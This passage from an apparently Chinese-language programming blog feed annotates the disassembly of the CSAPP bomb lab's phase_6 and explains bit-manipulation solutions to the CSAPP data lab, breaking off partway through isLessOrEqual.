<span class="hljs-number">10</span>                <span class="hljs-built_in">sub</span>    (%rax),%edx <span class="hljs-comment">// 7-rsp指向的值</span><br>  <span class="hljs-number">401164</span>:<span class="hljs-number">89</span> <span class="hljs-number">10</span>                mov    %edx,(%rax) <span class="hljs-comment">// 再将7-rsp指向的值放到rsp指向的位置</span><br>  <span class="hljs-number">401166</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rax <span class="hljs-comment">// rax+4</span><br>  <span class="hljs-number">40116</span>a:<span class="hljs-number">48</span> <span class="hljs-number">39</span> f0             cmp    %rsi,%rax <span class="hljs-comment">// rsi和rax比较</span><br>  <span class="hljs-number">40116</span>d:<span class="hljs-number">75</span> f1                jne    <span class="hljs-number">401160</span> &lt;phase_6+<span class="hljs-number">0x6c</span>&gt; <span class="hljs-comment">// 如果不一样，则继续循环</span><br><span class="hljs-comment">// 现在栈顶的6个数字分别是，6 5 4 3 2 1</span><br><span class="hljs-comment">// 下面的操作是根据栈顶的六个数字，去一个链表里取结点</span><br>  <span class="hljs-number">40116f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%esi <span class="hljs-comment">// esi置为0</span><br>  <span class="hljs-number">401174</span>:eb <span class="hljs-number">21</span>                jmp    <span class="hljs-number">401197</span> &lt;phase_6+<span class="hljs-number">0xa3</span>&gt; <span class="hljs-comment">// 跳转</span><br><br>  <span class="hljs-number">401176</span>:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">52</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rdx),%rdx <span class="hljs-comment">// rdx+8指向的值放到rdx中</span><br>  <span class="hljs-number">40117</span>a:<span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>             add    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// eax+1</span><br>  <span class="hljs-number">40117</span>d:<span class="hljs-number">39</span> c8                cmp    %ecx,%eax <span class="hljs-comment">// ecx中存放的是我们输入的数字，</span><br>  <span class="hljs-number">40117f</span>:<span class="hljs-number">75</span> f5                jne    <span class="hljs-number">401176</span> &lt;phase_6+<span class="hljs-number">0x82</span>&gt; <span class="hljs-comment">// 如果不同的话，就不断循环</span><br><br>  <span class="hljs-number">401181</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">401188</span> &lt;phase_6+<span class="hljs-number">0x94</span>&gt;<br>  <span class="hljs-number">401183</span>:ba d0 <span class="hljs-number">32</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x6032d0</span>,%edx<br><br>  <span class="hljs-number">401188</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">54</span> <span class="hljs-number">74</span> <span class="hljs-number">20</span>       mov    %rdx,<span class="hljs-number">0x20</span>(%rsp,%rsi,<span class="hljs-number">2</span>) <span class="hljs-comment">// 6304544 6304528 6304512 6304496 6304480 0x6032d0</span><br>  <span class="hljs-number">40118</span>d:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c6 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rsi<br>  <span class="hljs-number">401191</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> fe <span class="hljs-number">18</span>          cmp    $<span class="hljs-number">0x18</span>,%rsi<br>  <span class="hljs-number">401195</span>:<span class="hljs-number">74</span> <span class="hljs-number">14</span>                je     <span class="hljs-number">4011</span>ab &lt;phase_6+<span class="hljs-number">0xb7</span>&gt;<br><br>  <span class="hljs-number">401197</span>:<span class="hljs-number">8b</span> <span class="hljs-number">0</span>c <span class="hljs-number">34</span>             <span class="hljs-built_in">mov</span>    (%rsp,%rsi,<span class="hljs-number">1</span>),%ecx <span class="hljs-comment">// 取出栈顶的元素放到ecx</span><br>  <span class="hljs-number">40119</span>a:<span class="hljs-number">83</span> f9 <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0x1</span>,%ecx <span class="hljs-comment">// 元素和1相比</span><br>  <span class="hljs-number">40119</span>d:<span class="hljs-number">7</span>e e4                jle    <span class="hljs-number">401183</span> &lt;phase_6+<span class="hljs-number">0x8f</span>&gt; <span class="hljs-comment">// 如果元素小于等于1，则跳转</span><br>  <span class="hljs-number">40119f</span>:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// eax置为1</span><br>  <span class="hljs-number">4011</span>a4:ba d0 <span class="hljs-number">32</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x6032d0</span>,%edx <span class="hljs-comment">// edx置为0x6032d0</span><br>  <span class="hljs-number">4011</span>a9:eb cb                jmp    <span class="hljs-number">401176</span> &lt;phase_6+<span class="hljs-number">0x82</span>&gt;<br><br><span class="hljs-comment">// 上面的操作花了这么大牛劲，就是把6304544 6304528 6304512 6304496 6304480 0x6032d0这六个地址放在了rsp+32 +0 +8 +16 +24 +32 +40的位置 好像刚好放满了这个栈</span><br>  <span class="hljs-number">4011</span>ab:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">20</span>       mov    <span class="hljs-number">0x20</span>(%rsp),%rbx <span class="hljs-comment">// 把rbx置为rsp+32指向的值</span><br>  <span class="hljs-number">4011b</span>0:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">28</span>       lea    <span class="hljs-number">0x28</span>(%rsp),%rax <span class="hljs-comment">// 把rax置为rsp+40，即上述操作栈的第二个元素的位置</span><br>  <span class="hljs-number">4011b</span>5:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">74</span> <span class="hljs-number">24</span> <span class="hljs-number">50</span>       lea    <span class="hljs-number">0x50</span>(%rsp),%rsi <span class="hljs-comment">// 把rsi置为rsp+80，即整个栈的终点</span><br>  <span class="hljs-number">4011b</span>a:<span class="hljs-number">48</span> <span class="hljs-number">89</span> d9             mov    %rbx,%rcx <span class="hljs-comment">// 把rcx置为第一个值</span><br>  <span class="hljs-comment">// 这里好像是循环着把一个链表给串起来</span><br>  <span class="hljs-number">4011b</span>d:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">10</span>             <span class="hljs-built_in">mov</span>    (%rax),%rdx <span class="hljs-comment">// 把rdx置为第二个值</span><br>  <span class="hljs-number">4011</span>c0:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">51</span> <span class="hljs-number">08</span>          mov    %rdx,<span class="hljs-number">0x8</span>(%rcx) <span class="hljs-comment">// 把第二个值放到rcx+8指向的位置</span><br>  <span class="hljs-number">4011</span>c4:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0x8</span>,%rax <span class="hljs-comment">// rax+=1，即指向下一个值</span><br>  <span class="hljs-number">4011</span>c8:<span class="hljs-number">48</span> <span class="hljs-number">39</span> f0             cmp    %rsi,%rax <span class="hljs-comment">// 比较是否到了终点</span><br>  <span class="hljs-number">4011</span>cb:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4011</span>d2 &lt;phase_6+<span class="hljs-number">0xde</span>&gt; <span class="hljs-comment">// 到了终点则跳转</span><br>  <span class="hljs-number">4011</span>cd:<span class="hljs-number">48</span> <span class="hljs-number">89</span> d1             mov    %rdx,%rcx <span class="hljs-comment">// 否则将rcx变成rdx，即变成第二个点</span><br>  <span class="hljs-number">4011</span>d0:eb eb                jmp    <span class="hljs-number">4011b</span>d &lt;phase_6+<span class="hljs-number">0xc9</span>&gt;<br> <span class="hljs-comment">// 将链表最后一个节点的next指针置为0</span><br>  <span class="hljs-number">4011</span>d2:<span class="hljs-number">48</span> c7 <span class="hljs-number">42</span> <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movq   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0x8</span>(%rdx) <br>  <span class="hljs-number">4011</span>d9:<span class="hljs-number">00</span> <br><span class="hljs-comment">// 链表降序排序 443 477 691 924 168 332</span><br>  <span class="hljs-number">4011</span>da:bd <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x5</span>,%ebp <span class="hljs-comment">// ebp置为5</span><br>  <span class="hljs-number">4011</span>df:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">43</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rbx),%rax <span class="hljs-comment">// 此时rbx是第一个结点的地址，因此rax是第二个结点的地址</span><br>  <span class="hljs-number">4011e3</span>:<span class="hljs-number">8b</span> <span class="hljs-number">00</span>                <span class="hljs-built_in">mov</span>    (%rax),%eax  <span class="hljs-comment">// 将eax置为第二个结点</span><br>  <span class="hljs-number">4011e5</span>:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx) <span class="hljs-comment">// 比较第二个结点和第一个结点的值</span><br>  <span class="hljs-number">4011e7</span>:<span class="hljs-number">7</span>d <span class="hljs-number">05</span>                jge    <span class="hljs-number">4011</span>ee &lt;phase_6+<span class="hljs-number">0xfa</span>&gt; <span class="hljs-comment">// 第一个如果要大于等于第二个，那么就跳过炸弹，否则就爆炸</span><br>  <span class="hljs-number">4011e9</span>:e8 <span class="hljs-number">4</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">4011</span>ee:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">5b</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rbx),%rbx<br>  <span class="hljs-number">4011f</span>2:<span class="hljs-number">83</span> ed <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0x1</span>,%ebp<br>  <span class="hljs-number">4011f</span>5:<span class="hljs-number">75</span> e8                jne    <span class="hljs-number">4011</span>df &lt;phase_6+<span class="hljs-number">0xeb</span>&gt;<br>  <span class="hljs-number">4011f</span>7:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">50</span>          add    $<span class="hljs-number">0x50</span>,%rsp<br>  <span class="hljs-number">4011f</span>b:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">4011f</span>c:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-number">4011f</span>d:<span class="hljs-number">41</span> <span class="hljs-number">5</span>c                pop    %r12<br>  <span class="hljs-number">4011f</span>f:<span class="hljs-number">41</span> <span class="hljs-number">5</span>d                pop    %r13<br>  <span class="hljs-number">401201</span>:<span class="hljs-number">41</span> <span class="hljs-number">5</span>e                pop    %r14<br>  <span class="hljs-number">401203</span>:c3                   retq   <br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab1</title>
    <link href="/2023/07/27/csapp-lab1/"/>
    <url>/2023/07/27/csapp-lab1/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#bitxor">bitXor</a></li><li><a href="#tmin">tmin</a></li><li><a href="#istmax">isTmax</a></li><li><a href="#alloddbits">allOddBits</a></li><li><a href="#negate">negate</a></li><li><a href="#isasciidigit">isAsciiDigit</a></li><li><a href="#conditional">conditional</a></li><li><a href="#islessorequal">isLessOrEqual</a></li><li><a href="#logicalneg">logicalNeg</a></li><li><a href="#howmanybits">howManyBits</a></li><li><a href="#floatscale2">floatScale2</a></li><li><a href="#floatfloat2int">floatFloat2Int</a></li><li><a href="#floatpower2">floatPower2</a></li></ul><p>修改<code>bits.c</code>，使其满足<code>btest</code>的测试，代码规范<code>./dlc bits.c</code><br>测试</p><ol><li>make clean</li><li>make btest</li><li>.&#x2F;btest</li></ol><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224201936.png" alt="20231224201936"></p><h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><p>思路</p><ol><li>题目的意思是用按位&amp;和取反~实现异或^操作。</li><li>即x和y的同一位置如果都是1或者都是0，那么异或之后是0，否则是1<ol><li>x &amp; y的结果的某一位为1，代表x和y的这一位都是1。而如果x和y的某一位都是1，那么经过异或操作时候，这一位应该是0，所以对这个结果取反，得到a。a的二进制表示中，每一个0都代表这个位置的x和y都是1。</li><li>刚刚处理了x和y同一位置都是1，现在应该处理两个位置都是0。可以通过先分别对x和y取反，将这个问题又转为处理同一位置为1。通过和上一步一样的操作，可以得到b。</li><li>a和b的二进制表示中，每一个0都代表x和y在这个位置同时是0或者同时是1。那么将a&amp;b就得到了异或的结果，即相同为0，不同为1。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp;</span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-comment">// 两个1的位置是0，否则是1</span><br>  <span class="hljs-type">int</span> a = ~(x &amp; y);<br>  <span class="hljs-comment">// 两个0的位置是0，否则是1</span><br>  <span class="hljs-type">int</span> b = ~(~x &amp; ~y);<br>  <span class="hljs-comment">// 因此将a和b按位&amp;之后，两个1或者两个0的位置都是0，其他位置是1</span><br>  <span class="hljs-keyword">return</span> a &amp; b;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><p>思路</p><ol><li>送分题<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>; &#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><p>思路</p><ol><li>验证x是不是最大的有符号整数，最大的有符号整数应该是0x7fffffff，记为tmax</li><li>如果只能用位运算，那么要尽量将操作的数往0或者0xffffffff上靠，可以发现tmax+tmax+1正好就是0xffffffff。拿到了0xffffffff，那就好办了，对它取反，正好得到0，也就是下面代码里的b</li><li>那么是不是只有tmax可以通过~(x+x+1)的操作得到0呢，不是！0xffffffff也是可以得到0的。因此还需要对它进行特判。它加上1或者取反正好就是0,再取个非，刚好就是1，也就是下面代码里的c。</li><li>综上所述，b为0，并且c也等于0，才能够证明x是Tmax<br>易错点</li><li>这一题相当于是根据Tmax的特点进行一些操作，得到一个只有Tmax才能经过这一系列操作得到的值。但是还有一个边界情况那就是0xffffffff需要特判。写代码的时候要小心这些corn case<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 0xffffffff，这一步不能用异或</span><br>  <span class="hljs-type">int</span> a = x + x + <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 0x00000000，如果b为0，那么b要么是0x3fffffff，要么是0xffffffff</span><br>  <span class="hljs-type">int</span> b = ~a;<br>  <span class="hljs-comment">// 排除x为0xffffffff，如果x是0xffffffff，那么c就是1，否则c就是0</span><br>  <span class="hljs-type">int</span> c = !(x + <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 只有b和c都是0，才返回1</span><br>  <span class="hljs-keyword">return</span> !(b | c);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><p>思路</p><ol><li>这一题要判断这个数是否满足：所有的奇数位都是1</li><li>那么可以通过0xAAAAAAAA这个数与x进行按位与，将取出所有的奇数位，并将偶数为置0</li><li>如果这个数所有奇数位都是1，那么它现在应该和0xAAAAAAAA相同。相同的话异或为0，再取个反，刚好是1。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 构造出奇数位均为1的数</span><br>  <span class="hljs-type">int</span> a = (<span class="hljs-number">0xaa</span> &lt;&lt; <span class="hljs-number">24</span>) + (<span class="hljs-number">0xaa</span> &lt;&lt; <span class="hljs-number">16</span>) + (<span class="hljs-number">0xaa</span> &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">0xaa</span>;<br>  <span class="hljs-comment">// 将a看做掩码，取出x中所有奇数位</span><br>  <span class="hljs-type">int</span> b = x &amp; a;<br>  <span class="hljs-comment">// 判断a和b是否相同，只有当a和b相同，异或才为0，那么取！后才为1</span><br>  <span class="hljs-keyword">return</span> !(a ^ b);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><p>思路</p><ol><li>送分题，按位取反，末位加1<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * negate - return -x</span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123; <span class="hljs-keyword">return</span> (~x) + <span class="hljs-number">1</span>; &#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><p>思路</p><ol><li>判断这个数是否在$0x30 &lt;&#x3D; x &lt;&#x3D; 0x39$这个范围内</li><li>这个范围可以写成十六进制，即<ol><li>0x 0011 0000</li><li>0x 0011 1001</li></ol></li><li>可以发现，高28位一定是0x0000003，低4位则在0x0到0x9之间。<ol><li>所以先将高28位取出来，判断是否是0x0000003</li><li>再将低4位取出来<ol><li>低4位里，如果第4位是0，那么对低三位则没有要求</li><li>如果第4位是1，那么第二位和第三位一定是0，对低1位没有要求</li></ol></li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27;</span><br><span class="hljs-comment"> * to &#x27;9&#x27;) Example: isAsciiDigit(0x35) = 1. isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 0x 0011 0000</span><br>  <span class="hljs-comment">// 0x 0011 1001</span><br>  <span class="hljs-comment">// 首先，右移4位之后，应该是0x3，即a=1</span><br>  <span class="hljs-type">int</span> a = !((x &gt;&gt; <span class="hljs-number">4</span>) ^ (<span class="hljs-number">0x3</span>));<br>  <span class="hljs-comment">// 低4位，要么第4位为0，要么就只能是1001或者1000</span><br>  <span class="hljs-comment">// b为1，代表第4位为0</span><br>  <span class="hljs-type">int</span> b = !((x &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// c为1，代表为1001或者1000，即第1位和第4位无所谓，但是第2和第3位必须是0</span><br>  <span class="hljs-type">int</span> c = !(x &amp; <span class="hljs-number">0x6</span>);<br>  <span class="hljs-comment">// printf(&quot;-----------------\n%x\n%d\n%d\n%d\n%d\n&quot;,x,a,b,c,a&amp;(b|c));</span><br>  <span class="hljs-keyword">return</span> a &amp; (b | c);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><p>思路</p><ol><li>实现三目运算符</li><li>主要是看x，如果x不为0，那么返回y，如果x为0，那么返回z。</li><li>这个做法就有点tricky<ol><li>如果x不为0，那么将x变为0xffffffff</li><li>如果x为0，那么将x变为0 </li><li>在上面改变的基础上，<ol><li>如果x不为0，那么应该返回y，此时的x经过变换之后是全1<ol><li>将x和y按位与，按位与的结果就是y</li><li>将~x和z按位与，按位与的结果是0</li><li>将上述两个结果进行按位或操作，得到的就是y</li></ol></li><li>之所以使用按位或操作，是因为如果x为0，依然可以返回正确结果。此时x和y按位与就是0，~x和z按位与的结果就是z，按位或之后的结果就是z</li><li>如何将非0的x变为全1呢？首先通过两次！操作，可以把非零的x变为1，此时对它取反再加1就是全1了</li></ol></li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * conditional - same as x ? y : z</span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>  <span class="hljs-comment">// 如果x不为0，则得到一个全1的数，如果x为0，则得到一个全0的数</span><br>  <span class="hljs-comment">// 如果x为0，则得到0，如果x非0，则得到1</span><br>  <span class="hljs-type">int</span> a = !!x;<br>  <span class="hljs-comment">// 如果a为0，则b为0，如果a为1，则b为-1，即全1</span><br>  <span class="hljs-type">int</span> b = ~a + <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// c和d一定有一个为0</span><br>  <span class="hljs-type">int</span> c = b &amp; y;<br>  <span class="hljs-type">int</span> d = ~b &amp; z;<br>  <span class="hljs-keyword">return</span> c | d;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><p>思路</p><ol><li>判断x是否小于等于y</li><li>如果x和y符号不同<ol><li>如果x为负数，则小于y</li><li>如果x为正数，则大于y</li></ol></li><li>如果x和y符号相同，则需要计算x和y的差值，因为不可以直接用减号，计算x-y，其实就是计算x+（y的补码）<ol><li>如果差值小于0，则小于y</li><li>如果差值大于0，则大于y</li></ol></li><li>还需要特判一下x是否等于y<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-comment">// 如果符号不同，则正数更大，如果符号相同，则看差值，还要特判一下x是否和y相同</span><br>  <span class="hljs-type">int</span> x_flag = x &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int</span> y_flag = y &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 如果flag_not_same为1，则代表符号不同，如果为0，则代表符号相同</span><br>  <span class="hljs-type">int</span> flag_not_same = x_flag ^ y_flag;<br>  <span class="hljs-comment">// 还要结合差值的正负来看,x-y，即x+(y的补码)</span><br>  <span class="hljs-type">int</span> y_ = ~y + <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int</span> sub_flag = (x + y_) &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 如果符号不同并且x为负，即a=1，即x_flag=1，并且flag_not_same=1，</span><br>  <span 